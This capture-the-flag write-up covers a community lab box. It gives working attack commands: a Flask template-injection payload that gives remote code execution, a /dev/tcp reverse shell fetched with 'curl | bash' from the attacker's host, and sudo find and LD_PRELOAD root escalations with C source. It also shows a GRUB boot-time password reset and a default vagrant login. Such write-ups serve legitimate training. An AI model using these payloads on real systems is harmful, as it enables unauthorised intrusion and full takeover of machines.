# Th3HackerNewsBdarija box Writeup

## Introduction 

Yo 
Before starting this writeup, we would like to thank Thehackernewsbdarija community and thank the staff that created this box.

![image](https://c.tenor.com/G0PWi59OVk0AAAAM/mr-bean-delicious.gif)

And i'm happy because i won this competition

![happy](https://c.tenor.com/aSW9ZfIIC64AAAAC/shaq-shimmy.gif)

Description [Moroccan Darija] : https://www.facebook.com/Th3HackerNewsBdarija/posts/219555037030078

Download link : https://drive.google.com/file/d/1ipYcoAsZ-uTrSpFcu4s0oo0OmBKqHwgk/view?usp=sharing

Enjoy!

## Writeup

### Web 
let's find the ip for the machine, i used netdiscover but you are free to use nmap or your router page 

```bash
netdiscover -r 192.168.1.1/24
```

I started by fuzzing on parameters to detect any parametes

![bigdd](https://imgur.com/aB2aOjP.png)

After getting the "search" parameter we can remark that it is infected by a "Flask SSTI2" vulnerability 

`http://192.168.1.108/?search={{3 * 3}}`

![pp](https://imgur.com/xFVJDr0.png)

We can exploit that to get an rce

`http://192.168.1.108/?search={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`

![bigppp](https://imgur.com/yqqngBi.png)

Getting a reverse shell
    localhost :

```bash
echo "/bin/bash -l > /dev/tcp/192.168.1.109/4444 0<&1 2>&1" > payload.sh
python -m SimpleHTTPServer
nc -nlvp 4444
```

    Server : http://192.168.1.108/?search={{request.application.__globals__.__builtins__.__import__('os').popen('curl http://192.168.1.109:8000/payload.sh | bash').read()}}

and we got a shell : 

![ppd](https://i.imgur.com/QWpoHLI.png)

### Pwn 

After getting a shell as c3p0 we can see an executable "hackernews"

![bigpp](https://i.imgur.com/gULwJX9.png)

This executable asks for a password 

![ON0WT2w.png](https://i.imgur.com/ON0WT2w.png)

We can simply find the password by using strings 

![pwn](https://imgur.com/GF8XlNx.png)

By submitting the file we get an encoded password 

![pp](https://i.imgur.com/4P3761I.png)

The encoded password is encoded with Vigenere cipher with decode.fr

![hh](https://imgur.com/8IWQ4BL.png)

`user.txt : thnb{m4b9a_w4l0_4lm0jt4h1D}`

### Privelege esculation

Using `sudo -l` to check user priveleges, we can see that `c3p0` user can execute the find command as root user.

![find](https://i.imgur.com/2xhEgge.png)

We can exploit that using gftobins 

![sudo](https://imgur.com/WjO72Kg.png)

```bash
sudo find . -exec /bin/sh \; -quit
```

Eventually after using this command we can get a shell as root and read the flag

![root](https://imgur.com/feER4s4.png)

`root flag : thnb{br4v0_4kh4y_lH4ck3r_y0u_d1D_1t}`

### Privelege esculation 2

There's another technique for privilige escalation by exploiting the environment variable “LD_Preload”

As we can see by typing sudo -l we detected the environment variable

![ld](https://i.imgur.com/K5mSsMI.png)

Let’s create a C program file inside /tmp directory

![sh](https://i.imgur.com/CK0HxPt.png)

```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {

unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");

}
```

![sh](https://i.imgur.com/fBG2766.png)

Let's compile it and execute it 

```Bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
ls -al shell.so
sudo LD_PRELOAD=/tmp/shell.so find
id
whoami
```

![ld](https://i.imgur.com/00Ba4Nc.png)

And we are root! 

## Other techniques

### Ubuntu Recovering Password 

We can get root by using Ubuntu recovering password

Once you boot your machine keep holding on `SHIFT` to enter The grub menu

![ub](https://i.imgur.com/TTvYvdX.png)

Then press on `E` on your keyboard to edit the grub panel 

![ub](https://i.imgur.com/ejJ3irz.png)

Find any line starting with “Linux” and change access from read-only to read-write by just replacing ro `console=tty1 console=ttyS0` to `rw init=/bin/bash`

![pp](https://i.imgur.com/UwnUmmI.png)

To save the changes and to boot, press `Ctrl-x` and now booting with both read and write access into a Linux kernel

![popp](https://i.imgur.com/VI2VwE8.png)

Type passwd and enter a new password 

![bip](https://i.imgur.com/DZU7WsT.png)

Reboot your machine and login with root and the new password that you created

![peed](https://i.imgur.com/VNLz4T6.png)

And now we have access to both flags

![user](https://i.imgur.com/Upxz1AX.png)

![root](https://i.imgur.com/YhPJunl.png)

### Vagrant SSH 

By default in a box, vagrant user is enabled in the ssh config

```Bash
User vagrant
IdentityFile ~/.ssh/vagrant
````

Let's try to log in with the `USER:PASS = vagrant:vagrant`
 
 ```Bash
 ssh vagrant@192.168.1.109
 ```

It works

![ssh](https://i.imgur.com/yhXFTtu.png)

let's run `sudo -l` to check user priveleges

![ssh](https://i.imgur.com/U98OK4R.png)

We can see that we can run any command as root

Let's run `sudo -s` and we got root 

![ssh](https://i.imgur.com/IJ0zluF.png)


# Conclusion 

I hope you like the writeup 
Good Hacking ! Peace
